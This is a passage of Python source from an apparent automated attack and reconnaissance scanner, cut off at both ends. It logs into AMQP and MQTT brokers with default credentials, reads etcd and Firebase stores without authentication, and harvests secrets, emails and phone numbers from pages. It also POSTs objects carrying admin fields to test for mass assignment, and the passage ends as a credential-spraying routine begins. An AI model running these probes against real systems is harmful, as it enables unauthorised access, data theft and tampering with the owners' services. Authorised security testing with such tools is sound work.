            conn = aiohttp.TCPConnector(limit=0, ssl=False)
            async with plain_session(conn) as s:
                async with s.post(f"http://{h}:{p}/v3/kv/range",
                                  data=b'{"key":"AA=="}',
                                  headers={**UA, "Content-Type":
                                           "application/json"},
                                  ssl=False, allow_redirects=False,
                                  timeout=aiohttp.ClientTimeout(total=6)) as r:
                    body = await r.content.read(65536) if r.status == 200 else b""
                if not body:
                    async with s.get(f"http://{h}:{p}/v2/keys/?recursive=true",
                                     headers=UA, ssl=False,
                                     allow_redirects=False,
                                     timeout=aiohttp.ClientTimeout(
                                         total=6)) as r2:
                        if r2.status == 200:
                            body = await r2.content.read(65536)
        except Exception:
            return
        low = body.lower()
        if b'"header"' in low or b'"node"' in low:
            hits += 1
            findings.append(
                f"[ETCD-KV] {h}:{p} kv range answered unauthenticated - "
                f"every etcd key (secrets, tokens, kubeconfigs) is readable")

    async def amqp_default(h, p):
        # AMQP 0-9-1: protocol header -> Connection.Start -> Start-Ok with
        # PLAIN guest:guest -> Connection.Tune means the credentials were
        # accepted; Connection.Close (any reply-code) means refused.
        nonlocal hits

        async def read_method(rd):
            hdr = await asyncio.wait_for(rd.readexactly(7), 5)
            if hdr[0] != 1:                       # method frame only
                return None
            body = await asyncio.wait_for(
                rd.readexactly(int.from_bytes(hdr[3:7], "big")), 5)
            if await asyncio.wait_for(rd.readexactly(1), 5) != b"\xce":
                return None
            return (int.from_bytes(body[0:2], "big"),
                    int.from_bytes(body[2:4], "big"))

        def frame(payload):
            return (b"\x01\x00\x00" + len(payload).to_bytes(4, "big")
                    + payload + b"\xce")

        try:
            async with asyncio.timeout(8):
                rd, wr = await asyncio.open_connection(h, p)
                try:
                    wr.write(b"AMQP\x00\x00\x09\x01")
                    await wr.drain()
                    m = await read_method(rd)
                    if m != (10, 10):             # Connection.Start
                        return
                    resp = (struct.pack(">HH", 10, 11)
                            + b"\x00\x00\x00\x0c\x06productS\x03sxe"
                            + b"\x05PLAIN"
                            + (11).to_bytes(4, "big") + b"\x00guest\x00guest"
                            + b"\x05en_US")
                    wr.write(frame(resp))
                    await wr.drain()
                    m = await read_method(rd)
                    if m == (10, 30):             # Connection.Tune
                        hits += 1
                        findings.append(
                            f"[AMQP-DEFAULT] {h}:{p} authenticates AMQP with "
                            f"the default guest:guest (Connection.Tune) - "
                            f"full broker access: queues, messages, routing "
                            f"keys")
                finally:
                    try:
                        wr.close()
                        await wr.wait_closed()
                    except Exception:
                        pass
        except Exception:
            return

    async def mqtt_default(h, p):
        # anonymous CONNECT came back as a deny (rc != 0): retry with
        # factory/default accounts; CONNACK rc=0 = credentials accepted
        nonlocal hits
        pairs = (("admin", "admin"), ("admin", "password"),
                 ("guest", "guest"), ("mqtt", "mqtt"), ("test", "test"),
                 ("user", "user"), ("root", "root"))

        def connect(user, pw):
            var = (b"\x00\x04MQTT\x04" + b"\xc2" + b"\x00\x3c"
                   + b"\x00\x03sxe"
                   + len(user).to_bytes(2, "big") + user
                   + len(pw).to_bytes(2, "big") + pw)
            return b"\x10" + bytes([len(var)]) + var

        try:
            async with asyncio.timeout(8):
                for u, pw in pairs:
                    rd, wr = await asyncio.open_connection(h, p)
                    try:
                        wr.write(connect(u.encode(), pw.encode()))
                        await wr.drain()
                        r = await asyncio.wait_for(rd.read(4), 5)
                        if r[:4] == b"\x20\x02\x00\x00":
                            hits += 1
                            findings.append(
                                f"[MQTT-DEFAULT] {h}:{p} accepts CONNECT with "
                                f"the default credentials {u}:{pw} (CONNACK "
                                f"accepted) - full pub/sub on the message bus")
                            return
                    finally:
                        try:
                            wr.close()
                            await wr.wait_closed()
                        except Exception:
                            pass
        except Exception:
            return

    async def one(h, p, ban):
        nonlocal hits
        if p in SVC_HTTP:
            path, needles, tag, desc = SVC_HTTP[p]
            await http_check(h, p, path, needles, tag, desc)
        elif p in SVC_RAW:
            payload, ok, deny, tag, desc = SVC_RAW[p]
            if p == 6379 and (ban or "").startswith("+PONG"):
                hits += 1
                findings.append(f"[{tag}] {h}:{p} {desc}")
            elif p == 6379 and (ban or "").startswith("-NOAUTH"):
                await redis_weak(h, p)
                return                       # password-protected: no anon claim
            elif (p == 1883 and isinstance(ban, bytes)
                  and ban[:3] == b"\x20\x02\x00" and ban[3:4] != b"\x00"):
                await mqtt_default(h, p)     # anonymous denied -> default creds
                return
            elif (p == 5432 and isinstance(ban, bytes) and len(ban) >= 9
                  and ban[:1] == b"R"
                  and int.from_bytes(ban[5:9], "big") in (3, 5)):
                hits += await pg_default(h, p, findings)  # md5/cleartext
                return
            else:
                await raw_check(h, p, payload, ok, deny, tag, desc)
        elif p == VNC_PORT:
            await vnc_check(h, p)
        elif p == 873:
            await rsync_check(h)
        elif p == 27017:
            await mongo_check(h, p)
        elif p == 3389:
            await rdp_check(h, p)
        elif p == 1099:
            await rmi_check(h, p)
        elif p == 8009:
            await ajp_check(h, p)
        elif p == 7001:
            await weblogic_check(h, p)
        elif p == 3306:
            await mysql_empty_check(h, p)
        elif p == 143:
            await imap_check(h, p)
        elif p == 110:
            await pop3_check(h, p)
        elif p == 5672:
            await amqp_default(h, p)

    if cands:
        await asyncio.gather(*[one(h, p, b) for (h, p), b in list(cands.items())])
        # KV escalation: the catalog/health checks above prove reachability,
        # these prove the SECRET store itself answers anonymously
        for (h, p) in list(cands):
            if p == 8500:
                await consul_kv_check(h, p)
            elif p == 2379:
                await etcd_kv_check(h, p)
            elif p == 15672:
                await rabbit_default(h, p)
    if hits:
        print(f"  [svc] -> {hits} unauthenticated service(s)", flush=True)
    return hits


# ---------------- phase 8: endpoints ----------------
def norm_path(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "ignore")
    raw = raw.strip()
    if not raw:
        return None
    if raw.startswith(("http://", "https://", "//")):
        sp = urlsplit(raw if "://" in raw else "http:" + raw)
        p, q = sp.path, sp.query
    elif raw.startswith("/"):
        p, sep, q = raw.partition("?")
    else:
        return None
    if not p.startswith("/") or len(p) > 300:
        return None
    if any(c in p for c in (" ", '"', "'", "\\", "`", "%", "$", "{", "}")):
        return None
    if "//" in p or ".." in p:
        return None
    low = p.lower()
    if low.endswith(STATIC_EXT) and "/api/" not in low:
        return None
    if p.endswith("/"):
        p = p[:-1]
    if not p or p == "/":
        return None
    if q:
        keys = sorted({kv.split("=")[0].split("#")[0] for kv in q.split("&")
                       if kv and kv.split("=")[0]})
        if keys:
            return p + "?" + "&".join(keys)
    return p


def mine(host, data, mined):
    if not data or mined is None:
        return
    out = mined.setdefault(host, set())
    for rx in (HREF_RE, FETCH_RE, OPEN_RE, API_RE):
        for m in rx.finditer(data):
            np = norm_path(m.group(1))
            if np:
                out.add(np)
    # GET forms: mine action + submitted field names so param_attacks gets
    # the keys the form really sends (?q&page - not just /search)
    for fm in FORM_RX.finditer(data):
        attrs, inner = fm.group(1), fm.group(2)
        if FORM_METHOD_POST_RX.search(attrs):
            continue
        am = FORM_ACTION_RX.search(attrs)
        if not am:
            continue
        names = list(dict.fromkeys(
            n.decode("utf-8", "ignore").lower()
            for n in FORM_NAME_RX.findall(inner)))[:12]
        raw = html.unescape(am.group(1).decode("utf-8", "ignore"))
        if names:
            sep = "&" if "?" in raw else "?"
            raw = raw + sep + "&".join(names)
        np = norm_path(raw)
        if np:
            out.add(np)


SITEMAP_LOC_RX = re.compile(r"<loc>\s*([^<]{4,600}?)\s*</loc>", re.I)
ROBOTS_SITEMAP_RX = re.compile(r"(?im)^sitemap:\s*(\S+)")


async def sitemap_paths(probes, cap_hosts=25, per_host=300):
    """fetch /sitemap.xml + robots-declared sitemaps on live hosts: those URLs
       are known-existing endpoints and often the only place query params are
       advertised. one level of sitemap-index children is followed; entries on
       other hosts are dropped. returns {path?keys: {hosts}}."""
    paths = {}
    hosts = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not hosts:
        return paths

    async def one(h):
        n = 0
        base = _burl(probes, h)
        root_net = base.split("://", 1)[1].lower()
        async with tsession(aiohttp.TCPConnector(limit=0, ssl=False)) as s:
            urls = [f"{base}/sitemap.xml"]
            st, rb, _ = await _grab(s, f"{base}/robots.txt", timeout=6,
                                    limit=60_000)
            if st == 200 and rb:
                urls += ROBOTS_SITEMAP_RX.findall(
                    rb.decode("utf-8", "ignore"))[:3]
            urls = list(dict.fromkeys(urls))[:4]
            locs = []
            for u in urls:
                st, body, _ = await _grab(s, u, timeout=8, limit=400_000)
                if st != 200 or not body:
                    continue
                if body[:2] == b"\x1f\x8b":          # sitemap.xml.gz
                    try:
                        body = gzip.decompress(body)
                    except Exception:
                        continue
                part = SITEMAP_LOC_RX.findall(
                    body.decode("utf-8", "ignore"))
                locs += part
                kids = [x for x in part
                        if x.lower().endswith((".xml", ".xml.gz"))][:3]
                for ku in kids:
                    st2, b2, _ = await _grab(s, ku, timeout=8, limit=400_000)
                    if st2 != 200 or not b2:
                        continue
                    if b2[:2] == b"\x1f\x8b":
                        try:
                            b2 = gzip.decompress(b2)
                        except Exception:
                            continue
                    locs += SITEMAP_LOC_RX.findall(b2.decode("utf-8", "ignore"))
                if len(locs) >= per_host:
                    break
            for raw in locs[:per_host]:
                sp = urlsplit(raw) if "://" in raw or raw.startswith("//") else None
                if sp is not None and sp.netloc and sp.netloc.lower() != root_net:
                    continue                      # other host's sitemap entry
                np = norm_path(html.unescape(raw))
                if np:
                    paths.setdefault(np, set()).add(h)
                    n += 1
        return n

    res = await asyncio.gather(*[one(h) for h in hosts])
    total = sum(r for r in res if isinstance(r, int))
    if total:
        print(f"  [sitemap] -> {total} path(s) from "
              f"{sum(1 for r in res if r)} host(s)", flush=True)
    return paths


async def wayback_paths(domains, limit=20000):
    paths, attr = set(), {}
    sem = asyncio.Semaphore(6)
    async with xsession() as s:
        jobs = [fetch(s, f"https://web.archive.org/cdx/search/cdx?url={d}&matchType=domain"
                         f"&fl=original&collapse=urlkey&limit={limit}", 40, sem)
                for d in domains]
        for text in await asyncio.gather(*jobs):
            if not text:
                continue
            for line in text.splitlines():
                line = line.strip()
                if not line.startswith("http"):
                    continue
                sp = urlsplit(line)
                p = sp.path or ""
                pl = p.lower()
                if (not p or len(p) > 300 or "\\" in p or "%5c" in pl or "%u" in pl
                        or " " in p or '"' in p or p.startswith("/&") or "nbsp" in pl):
                    continue
                if "/india/" in p or "/store/" in p:
                    continue
                whost = (sp.netloc or "").lower().split(":")[0]
                if p != "/":
                    paths.add(p)
                    if whost:
                        attr.setdefault(p, set()).add(whost)
                if sp.query:
                    q = "?" + "&".join(sorted({kv.split("=")[0] for kv in sp.query.split("&") if kv}))
                    paths.add(p + q)
                    if whost:
                        attr.setdefault(p + q, set()).add(whost)
    print(f"  [wayback] -> {len(paths)} archived paths", flush=True)
    return sorted(paths), attr


async def wayback_js(domains, limit=400, cap=40):
    urls, sem = [], asyncio.Semaphore(4)
    async with xsession() as s:
        jobs = [fetch(s, f"https://web.archive.org/cdx/search/cdx?url={d}&matchType=domain"
                         f"&filter=original:.*\\.js.*&fl=original&collapse=urlkey"
                         f"&limit={limit}", 30, sem)
                for d in domains]
        for text in await asyncio.gather(*jobs):
            if not text:
                continue
            for line in text.splitlines():
                line = line.strip()
                if line.startswith("http") and ".js" in line.lower() and line not in urls:
                    urls.append(line)
    return urls[:cap]


# ---------------- phase 9: secrets + leaks ----------------
def mask(val):
    return val[:8] + "..." + val[-4:] if len(val) > 16 else val[:4] + "..."


def short_u(where):
    return where if len(where) <= 90 else where[:87] + "..."


def harvest(host, where, data, surf):
    """phase 15: pull emails / phones / internal IPs out of any scanned blob."""
    if not data or surf is None:
        return
    blob = data if isinstance(data, bytes) else data.encode("utf-8", "ignore")
    if len(blob) > 400_000:
        blob = blob[:400_000]
    s = surf.setdefault(host, {"emails": {}, "phones": {}, "ips": {}})
    short = short_u(where)
    for m in EMAIL_RE.findall(blob):
        if len(s["emails"]) >= 30:
            break
        e = m.decode("utf-8", "ignore").lower().strip(".")
        if (not e or len(e) > 100 or _bad_email(e)
                or e.rsplit(".", 1)[-1] in BAD_EMAIL_TLD):
            continue
        s["emails"].setdefault(e, short)
    for mo in PHONE_RE.finditer(blob):
        if len(s["phones"]) >= 20:
            break
        g = mo.group()
        # precision gate: the pattern also matches any bare 10-digit run
        # (order ids, foreign numbers). claim only with an explicit +91/91
        # country prefix or phone-ish context inside the match window
        if not (g.startswith(b"+") or len(g) > 10 or PHONE_CTX_RX.search(
                blob[max(0, mo.start() - 48):mo.end() + 48])):
            continue
        p = re.sub(rb"[^\d]", b"", g).decode()
        s["phones"].setdefault(p, short)
    for m in PRIVIP_RE.findall(blob):
        if len(s["ips"]) >= 20:
            break
        ip = m.decode()
        if ip.startswith("127."):
            # loopback references in page content are dev boilerplate, not
            # an internal-network address leak (no-FP guard)
            continue
        s["ips"].setdefault(ip, short)


DOM_SRC_RX = re.compile(
    rb"location\.(?:hash|search|href)\b|document\.URL\b|document\.documentURI\b"
    rb"|document\.referrer\b|window\.name\b|location\[", re.I)
# call-style sinks: a bare call is always executable, never a read
DOM_SINK_RX = re.compile(
    rb"document\.write(?:ln)?\s*\(|insertAdjacentHTML\s*\(|\.html\s*\(\s*"
    rb"|eval\s*\(|new Function\s*\("
    rb"|setTimeout\s*\(\s*[\"'`]|setInterval\s*\(\s*[\"'`]", re.I)
# assignment sinks: .innerHTML / .outerHTML only count when WRITTEN - a
# read (i.innerHTML) or call (i.innerHTML(foo)) is not a sink
DOM_ASSIGN_SINK_RX = re.compile(rb"\.(?:inner|outer)HTML\s*=[^=]", re.I)
SANITIZER_RX = re.compile(
    rb"DOMPurify|sanitize|escapeHtml|htmlEscape|encodeEntities"
    rb"|xss(?:Filters?|Escaper)?\s*\(|_\s*\.\s*escape", re.I)
PM_LISTEN_RX = re.compile(
    rb"addEventListener\s*\(\s*[\"']message[\"']|onmessage\s*=", re.I)
PM_CONSUME_RX = re.compile(rb"\be(?:vent)?\.data\b|msg\.data\b|evt\.data\b", re.I)
PM_ORIGIN_OK_RX = re.compile(rb"\.origin\b|\[[\"']origin[\"']\]", re.I)
JS_COMMENT_RX = re.compile(rb"//[^\n]*|/\*.*?\*/", re.S)
# string literals are blanked before statement analysis: a src/sink pair
# inside a string (docs snippet, message template, HTML attribute) is data,
# not a flow. quotes are preserved so setTimeout("...") still matches.
_STR_BLANK_RX = re.compile(
    rb"""(?s)("(?:[^"\\\n]|\\.)*"|'(?:[^'\\\n]|\\.)*'|`(?:[^`\\]|\\.)*`)""",
    re.M)


def js_client_bug_scan(host, where, data, findings, cap=2):
    """client-side (static) checks on JS/page blobs:
    DOM-XSS - an untrusted source (location.hash/document.URL/window.name ...)
    flows to an HTML/JS sink (innerHTML assignment / document.write / eval ...)
    - no server filter can stop it. PM-ORIGIN - a message handler consumes
    event.data but never validates event.origin (cross-origin injection).
    FP gates: comments stripped, HTML documents analyzed by <script> region
    only (prose that MENTIONS sinks is not code), string literals blanked,
    innerHTML sinks require a WRITE context, sanitizer calls are skipped.
    returns findings added."""
    if not data or cap <= 0:
        return 0
    text = data if isinstance(data, bytes) else data.encode("utf-8", "ignore")
    text = text[:300_000]
    # hostile bodies with thousands of /* openers and no */ make the lazy
    # block-comment scan O(n^2) (~10^10 steps) and hang the event loop -
    # strip only line comments when the pair count is wildly unbalanced
    if text.count(b"/*") > 8 * text.count(b"*/") + 8:
        text = re.sub(rb"//[^\n]*", b"", text)
    else:
        text = JS_COMMENT_RX.sub(b"", text)
    lt = text.lower()
    if b"<script" in lt and b"</script>" in text:
        # HTML document: only script regions are executable - page prose,
        # docs and changelogs that merely mention sinks never fire
        parts = re.findall(rb"<script\b[^>]*>(.*?)</script>", text, re.I | re.S)
        js = b"\n;\n".join(parts)
        if not js.strip():
            return 0
    elif b"<html" in lt or b"<!doctype" in lt:
        return 0                        # HTML with no inline scripts at all
    else:
        js = text                       # raw JS blob (or HTML without html tag)
    dom = _STR_BLANK_RX.sub(b'""', js)
    short = short_u(where)
    n = 0

    # --- DOM-XSS: direct (same statement) or same-variable flow ---
    sinks, srcs = [], []
    # statement-boundary, not line: minified bundles are one giant line, so
    # a src and a sink in DIFFERENT statements used to look "same-line"
    for line in re.split(rb"[;{}\n]", dom):
        s = DOM_SRC_RX.search(line)
        k = DOM_ASSIGN_SINK_RX.search(line) or DOM_SINK_RX.search(line)
        if s and k and not SANITIZER_RX.search(line):
            sinks.append((k.group(0), s.group(0)))
        elif s:
            srcs.append(s.group(0))
        elif k and not SANITIZER_RX.search(line):
            sinks.append((k.group(0), None))
    if sinks and (srcs or any(sc for _, sc in sinks)) and n < cap:
        direct = [(sk, sc) for sk, sc in sinks if sc]
        flow = direct[0] if direct else None
        if not flow:
            # same-variable flow: short names are normal in hand-written
            # code (var q = location.search); the FP gates are the bounded
            # window, the statement-boundary sink check AND the
            # reassignment check below (stale taint is not a flow)
            for m in re.finditer(rb"([A-Za-z_$][\w$]{0,40})\s*=\s*"
                                 rb"(?:location\.(?:hash|search)|document\.URL"
                                 rb"|document\.referrer|window\.name)\b", dom, re.I):
                var = re.escape(m.group(1))
                tail = dom[m.end():m.end() + 4096]
                for um in re.finditer(rb"\b" + var + rb"\b", tail):
                    if re.search(rb"\b" + var + rb"\s*=[^=]", tail[:um.start()]):
                        continue    # reassigned before use: stale taint
                    ctx = tail[max(0, um.start() - 160): um.start()]
                    # statement-boundary: the sink must be in the SAME
                    # statement as the variable use - a ; {} or newline
                    # before it means a previous statement, not this flow
                    stmt = re.split(rb"[;{}\n]", ctx)[-1]
                    km = (DOM_ASSIGN_SINK_RX.search(stmt)
                          or DOM_SINK_RX.search(stmt))
                    if (km and not SANITIZER_RX.search(stmt)
                            and re.search(rb"=\s*[^;]{0,200}$|\.html\(|"
                                          rb"insertAdjacentHTML\(|document\.write\(",
                                          stmt, re.S)):
                        flow = (km.group(0), m.group(1))
                        break
                if flow:
                    break
        if flow:
            sk, sc = flow[0], flow[1]
            sk = sk.decode("latin-1", "ignore") if isinstance(sk, bytes) else str(sk)
            sc = sc.decode("latin-1", "ignore") if isinstance(sc, bytes) else str(sc)
            findings.append(
                f"[DOM-XSS] {host} ({short}) untrusted {sc[:24]} flows to "
                f"{sk[:24]} - client-side XSS, server-side filters never apply")
            n += 1

    # --- postMessage handler without origin validation ---
    # window-scoped: listener AND data-consumption must sit within 6KB of
    # each other, and no origin check in that window - a random .data use
    # elsewhere in a minified bundle is not evidence about this handler.
    # origin checks count in either member syntax: e.origin or e["origin"]
    if n < cap:
        lm = PM_LISTEN_RX.search(js)
        if lm:
            win = js[lm.start():lm.start() + 6000]
            if PM_CONSUME_RX.search(win) and not PM_ORIGIN_OK_RX.search(win):
                findings.append(
                    f"[PM-ORIGIN] {host} ({short}) message handler consumes "
                    f"event.data but never checks event.origin in its "
                    f"handler window - any page can inject data")
                n += 1
    return n


def scan_blob(host, where, data, findings, surf=None):
    hits = 0
    if not data:
        return 0
    short = short_u(where)
    harvest(host, where, data, surf)
    js_client_bug_scan(host, where, data, findings)
    firebase_seed(data)
    for name, rx in SECRETS:
        for m in re.finditer(rx, data):
            val = m.group(0)
            if (_SECRET_PLACEHOLDER_RX.search(val)
                    or _SECRET_RUN_RX.search(val)
                    or _SECRET_LIT_RX.search(val)):
                continue    # doc example / dummy / literal null: not a finding
            findings.append(f"[SECRET] {name} on {host} ({short}) -> "
                            f"{mask(val.decode('utf-8', 'ignore'))}")
            hits += 1
            break
    return hits


async def scan_host(session, host, info, findings, budget, mined, extra_scripts=(), surf=None):
    if not info.get("status") or not budget[0]:
        return 0
    used = 0
    blobs = [(info["final_url"] or f"https://{host}/", info.get("body") or b"")]
    scripts = list(dict.fromkeys(info.get("scripts", []) + list(extra_scripts)))[:12]
    maps = 0
    for js in scripts:
        if not budget[0] or used >= 10:
            break
        budget[0] -= 1          # reserve BEFORE the await: concurrent scan_host
        data = await fetch_blob(session, js, 10, HTTP_SEM, 500_000)  # calls must
        if data:                # not all pass the budget check on the same tick
            blobs.append((js, data))
            used += 1
            # sourceMappingURL exposure: fetch the map, require a v3 JSON with sources
            sm = re.search(rb"sourceMappingURL=(\S+)", data[-8192:])
            if sm and budget[0] > 0 and maps < 3:
                u = sm.group(1).decode("utf-8", "ignore").rstrip("*/ \t")
                if u and not u.startswith("data:"):
                    maps += 1
                    budget[0] -= 1
                    murl = urljoin(js, u)
                    md = await fetch_blob(session, murl, 8, HTTP_SEM, 600_000)
                    if md and md.lstrip()[:1] == b"{":
                        try:
                            mj = json.loads(md)
                            srcs = mj.get("sources") if isinstance(mj, dict) else None
                            if (isinstance(mj, dict) and mj.get("version") == 3
                                    and isinstance(srcs, list) and srcs):
                                findings.append(
                                    f"[SOURCEMAP] {js} -> {murl} "
                                    f"(v3 map, {len(srcs)} sources)")
                        except Exception:
                            # maps bigger than the read limit never parse -
                            # the v3 header block in the truncated head is
                            # still direct evidence the map is served
                            hm = md[:80_000]
                            if (re.search(rb'"version"\s*:\s*3', hm)
                                    and b'"sources"' in hm):
                                findings.append(
                                    f"[SOURCEMAP] {js} -> {murl} "
                                    f"(v3 map, >600KB - truncated read, "
                                    f"header block verified)")
        else:
            budget[0] += 1      # failed/skipped fetch: refund the reservation
    hits = 0
    for where, data in blobs:
        mine(host, data, mined)
        hits += scan_blob(host, where, data, findings, surf)
    return hits


# ---------------- firebase harvest + open-rules probe ----------------
FIREBASE_DBS = set()          # RTDB names harvested from JS/HTML (phase 9)
FIREBASE_BUCKETS = set()      # storage buckets (gs:// + firebasestorage URLs)
_FIREBASE_DB_RX = re.compile(
    rb"(?i)((?:https?://)?[a-z0-9\-]{2,80}\.firebaseio\.com)")
_FIREBASE_BUCKET_RX = re.compile(
    rb"(?i)(?:gs://|firebasestorage\.googleapis\.com/v0/b/|"
    rb"firebasestorage\.app/v0/b/)"
    rb"([a-z0-9][a-z0-9.\-]{2,120})")


def firebase_harvest(data):
    """-> (rtdb names, storage buckets) found in a JS/HTML blob. docs-style
       placeholder names are dropped (example/sample/... never claim)."""
    dbs, buckets = set(), set()
    if not data:
        return dbs, buckets
    low = data.lower()
    if b"firebase" not in low and b"gs://" not in low:
        return dbs, buckets
    for m in _FIREBASE_DB_RX.finditer(data):
        name = m.group(1).decode("utf-8", "ignore").lower()
        name = name.split("://", 1)[-1]
        name = name[:-len(".firebaseio.com")]
        if (re.fullmatch(r"[a-z0-9][a-z0-9\-]{1,80}", name)
                and not re.search(r"(?i)example|sample|placeholder|"
                                  r"changeme|your-", name)):
            dbs.add(name)
    for m in _FIREBASE_BUCKET_RX.finditer(data):
        b = m.group(1).decode("utf-8", "ignore").lower()
        if (re.fullmatch(r"[a-z0-9][a-z0-9.\-]{2,120}", b)
                and "googleapis" not in b
                and not re.search(r"(?i)example|sample|placeholder|"
                                  r"changeme|your-", b)):
            buckets.add(b)
    return dbs, buckets


def firebase_seed(data):
    """cheap harvest hook for scan_blob: remember names for firebase_scan
       (module sets keep it out of the findings plumbing)."""
    if not data:
        return
    dbs, buckets = firebase_harvest(data)
    if len(FIREBASE_DBS) < 40:
        FIREBASE_DBS.update(dbs)
    if len(FIREBASE_BUCKETS) < 30:
        FIREBASE_BUCKETS.update(buckets)


async def firebase_scan(session, findings, cap_db=6, cap_bucket=5):
    """probe harvested firebase resources. evidence rules:
       RTDB - /.json?shallow=true must return a non-empty object; the
       {"error": "Permission denied"} (locked rules) and 404 (no such db)
       answers never claim. storage - the v0/b/<bucket>/o listing must
       return an items array, or the XML ListBucketResult must come back
       from storage.googleapis.com; 401/403 never claim."""
    hits = 0
    for name in sorted(FIREBASE_DBS)[:cap_db]:
        st, body, _ = await _grab(
            session, f"https://{name}.firebaseio.com/.json?shallow=true",
            timeout=8)
        if st != 200 or not body:
            continue
        low = body.lstrip()[:200].lower()
        if b'"error"' in low:
            continue                # permission denied / 404 / other error
        try:
            j = json.loads(body[:200_000])
        except Exception:
            continue
        if not isinstance(j, (dict, list)) or not j:
            continue                # empty db: nothing proven readable
        if isinstance(j, dict):
            keys = ", ".join(str(k) for k in list(j)[:5])
        else:
            keys = f"{len(j)} top-level items"
        hits += 1
        findings.append(
            f"[FIREBASE-DB] {name}.firebaseio.com/.json returns data "
            f"unauthenticated (shallow keys: {keys}) - RTDB security rules "
            f"allow public read of the whole database")
    for bucket in sorted(FIREBASE_BUCKETS)[:cap_bucket]:
        items = None
        st, body, _ = await _grab(
            session, f"https://firebasestorage.googleapis.com/v0/b/"
                     f"{bucket}/o", timeout=8)
        if st == 200 and body and body.lstrip()[:1] == b"{":
            try:
                j = json.loads(body[:200_000])
                if isinstance(j, dict) and isinstance(j.get("items"), list) \
                        and j["items"]:
                    items = j["items"]
            except Exception:
                items = None
        if items is None:
            st, body, _ = await _grab(
                session, f"https://storage.googleapis.com/{bucket}",
                timeout=8)
            if st == 200 and b"<listbucketresult" in (body or b"").lower():
                keys = re.findall(rb"<key>([^<]{1,200})</key>",
                                   body[:100_000], re.I)
                items = ([k.decode("utf-8", "ignore") for k in keys[:50]]
                         or ["<xml listing>"])
        if not items:
            continue
        names = ", ".join(
            str(it.get("name") if isinstance(it, dict) else it)
            for it in items[:3])
        hits += 1
        findings.append(
            f"[FIREBASE-STORAGE] bucket {bucket} lists {len(items)} "
            f"object(s) without auth ({names}) - storage rules allow "
            f"public list/read")
    if hits:
        print(f"  [firebase] -> {hits} open firebase resource(s)", flush=True)
    return hits


# ---------------- wave 20: advanced attack methods ----------------
COMMON_PLUGINS = ("contact-form-7", "woocommerce", "jetpack", "elementor",
                  "wordfence", "yoast-seo", "akismet", "wpforms-lite",
                  "all-in-one-seo-pack", "classic-editor", "updraftplus",
                  "duplicate-post", "revslider", "js_composer", "elementor-pro",
                  "litespeed-cache", "w3-total-cache", "ninja-forms")


async def wp_plugin_ver(session, host, findings, cap=6):
    """probe common WP plugin readme.txt files for a Stable tag - the
       disclosed version feeds CVE matching (detection only, no exploit)."""
    hits = 0
    for scheme in ("https", "http"):
        for slug in COMMON_PLUGINS[:cap]:
            url = f"{scheme}://{host}/wp-content/plugins/{slug}/readme.txt"
            try:
                async with HTTP_SEM:
                    async with session.get(url, headers=UA,
                                           timeout=aiohttp.ClientTimeout(total=6),
                                           ssl=False, allow_redirects=False) as r:
                        if r.status != 200:
                            continue
                        body = await r.content.read(20_000)
            except Exception:
                continue
            mv = re.search(rb"(?im)^stable tag:\s*([\d.]{2,20})", body)
            if mv:
                ver = mv.group(1).decode("utf-8", "ignore").strip()
                findings.append(
                    f"[WP-PLUGIN-VER] {scheme}://{host}/wp-content/plugins/"
                    f"{slug}/readme.txt discloses version {ver} - check for "
                    f"known CVEs on this plugin version and hide the readme")
                hits += 1
        if hits:
            break
    return hits


async def mass_assign_scan(conn, probes, findings, cap_hosts=6):
    """POST a resource carrying privileged fields, then GET it back on a
       clean read path. only a GET that returns role/is_admin/... proves the
       server STORED the injected privileged fields (mass assignment); a POST
       that merely echoes its own request body never claims."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    if not targets:
        return 0
    hits = 0
    async with tsession(conn) as session:
      for h in targets:
        base = _burl(probes, h)
        tok = os.urandom(4).hex()
        benign = json.dumps({"name": f"sxeMass-{tok}", "title": f"sxeMass-{tok}"})
        elev = json.dumps({"name": f"sxeMass-{tok}", "title": f"sxeMass-{tok}",
                           "role": "admin", "is_admin": True,
                           "verified": True, "admin": True})
        hds = {"Content-Type": "application/json", **UA}
        st, hdr, body, loc = None, {}, b"", ""
        try:
            async with HTTP_SEM:
                async with session.post(base + "/api/items", data=elev,
                                        headers=hds, ssl=False,
                                        timeout=aiohttp.ClientTimeout(total=8),
                                        allow_redirects=False) as r:
                    st, hdr, body = r.status, dict(r.headers), await r.content.read(20_000)
                    loc = r.headers.get("Location") or ""
        except Exception:
            continue
        if st not in (200, 201) or not body:
            continue
        rid = None
        try:
            j = json.loads(body)
            if isinstance(j, dict):
                rid = j.get("id") or j.get("uuid") or j.get("slug")
        except Exception:
            j = None
        if not (rid or loc):
            continue                       # no handle to re-read: cannot prove storage
        read_url = loc if loc.startswith("http") else f"{base}{loc or '/api/items/' + str(rid)}"
        gst, gbody, _ = await _grab(session, read_url, timeout=8, limit=20000)
        if gst != 200 or not gbody:
            continue
        stored = re.search(
            rb'"(?:role|is_admin|admin|verified)"\s*:\s*("admin"|true)', gbody)
        if not stored:
            continue
        # control: a benign create (no privileged fields) whose read-back
        # carries no role/is_admin - rules out a model that always returns them
        cb = json.dumps({"name": f"sxeCtl-{tok}", "title": f"sxeCtl-{tok}"})
        cst, cbody, cloc = None, b"", ""
        try:
            async with HTTP_SEM:
                async with session.post(base + "/api/items", data=cb,
                                        headers=hds, ssl=False,
                                        timeout=aiohttp.ClientTimeout(total=8),
                                        allow_redirects=False) as r:
                    cst, cbody = r.status, await r.content.read(20_000)
                    cloc = r.headers.get("Location") or ""
        except Exception:
            cbody = b""
        if cst in (200, 201) and cbody:
            crid = None
            try:
                cj = json.loads(cbody)
                if isinstance(cj, dict):
                    crid = cj.get("id") or cj.get("uuid") or cj.get("slug")
            except Exception:
                crid = None
            curl = cloc if cloc.startswith("http") else (
                f"{base}{cloc or '/api/items/' + str(crid)}" if (crid or cloc) else "")
            if curl:
                cgs, cgb, _ = await _grab(session, curl, timeout=8, limit=20000)
                if cgs == 200 and re.search(
                        rb'"(?:role|is_admin|admin|verified)"\s*:\s*("admin"|true)',
                        cgb or b""):
                    continue                # model always returns them: no proof
        findings.append(
            f"[MASS-ASSIGN] {base}/api/items stores attacker-supplied "
            f"privileged fields (role/is_admin/verified present on the "
            f"clean read-back of the created object) - mass assignment / "
            f"over-POSTing lets a client set its own privileges")
        hits += 1
      if hits:
        print(f"  [massassign] -> {hits} mass-assignment hit(s)", flush=True)
    return hits


async def spray_default(conn, probes, findings, cap_forms=2):
